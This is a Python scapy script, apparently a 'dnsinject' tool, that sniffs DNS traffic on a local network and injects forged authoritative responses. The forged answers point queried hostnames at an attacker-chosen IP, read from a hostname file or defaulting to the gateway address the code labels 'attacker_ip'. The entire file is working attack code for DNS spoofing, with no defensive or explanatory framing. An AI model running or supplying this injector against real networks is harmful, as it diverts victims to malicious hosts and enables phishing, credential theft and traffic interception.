import sys
from scapy.all import *
import argparse
import netifaces

def send_print(pkt,malicious_ip):
	spoofed_pkt= IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
		UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
		DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=malicious_ip))

	send(spoofed_pkt)
	print "Packet Details:" + spoofed_pkt.summary()


def spoofer(pkt):
	if pkt.haslayer(DNSQR):
		if file_name is None:
			print "No file entered, using attacker's ip"
			send_print(pkt,attacker_ip)

		else:
			target_host= pkt[DNSQR].qname.rstrip('.')
			file=open(file_name,'r')
			for line in file:
				if target_host in line:
					ip_hostname= line.split(" ")
					spoofed_ip= ip_hostname[0]
					print "\nFound! Spoofing using the file entry of " + ip_hostname[1]
					send_print(pkt,spoofed_ip)

if __name__== '__main__':
	parser= argparse.ArgumentParser(add_help=False, description="DNS Spoofed Packet Injection")
	parser.add_argument("-i")
	parser.add_argument("-h")
	parser.add_argument('expression', nargs='*', action='store')
	args= parser.parse_args()
	interface= args.i
	file_name= args.h
	expression=args.expression
	final_expresssion=''
	attacker_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
	try:
		if file_name:
			print "Hostnames to be spoofed are presend in file: " +file_name
		if expression:
			for i in expression:
				final_expresssion=final_expresssion+i+' '
			final_expresssion=final_expresssion[0:-1]
			final_expresssion=final_expresssion+' and udp port 53'
			print "BPF Filter: " +final_expresssion
		else:
			final_expresssion='udp port 53 '
			print "BPF Filter: " +final_expresssion

		if interface:
			print "Sniffing on "+ interface
			sniff(iface= interface, filter=final_expresssion, store=0, prn=spoofer)

		else:
			print "Sniffing on default interface"
			interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
			sniff(iface= interface, filter=final_expresssion, store=0, prn=spoofer)

	except AttributeError:
		print "Invalid entry/entries"
		print "dnsinject [-i interface] [-h hostname] expression"
